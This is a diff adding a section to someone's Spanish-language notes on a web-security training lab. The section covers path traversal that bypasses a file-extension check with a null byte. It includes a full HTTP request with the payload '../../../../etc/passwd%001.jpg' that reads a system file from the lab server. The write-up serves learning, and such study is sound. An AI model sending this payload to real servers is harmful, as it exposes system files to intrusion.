@@ -129,3 +129,31 @@ Accept-Language: es-419,es;q=0.9
 Connection: close
 
 ```
+
+# File path traversal, validation of file extension with null byte bypass
+
+Para este laboratorio lo que se puede aprender es el uso del llamado "null byte"
+
+> Null Byte Injection is an active exploitation technique used to bypass sanity checking filters in web infrastructure by adding URL-encoded null byte characters (i.e. %00, or 0x00 in hex) to the user-supplied data.
+
+A mi manera de entender las cosas separa el nullbyte y si este laboratorio quiere imagenes .jpg o .png pues acepta el acrchivo anterior supongo
+por  que lo hace mediante regex
+
+```
+GET /image?filename=../../../../etc/passwd%001.jpg HTTP/1.1
+Host: 0a92007b04a52d1ac0615ba500a600f3.web-security-academy.net
+Cookie: session=IBhmvbGCRBVmaRKQVbqeWahDexv5QNXr
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Sec-Ch-Ua-Platform: "Windows"
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: image
+Referer: https://0a92007b04a52d1ac0615ba500a600f3.web-security-academy.net/
+Accept-Encoding: gzip, deflate
+Accept-Language: es-419,es;q=0.9
+Connection: close
+
+```
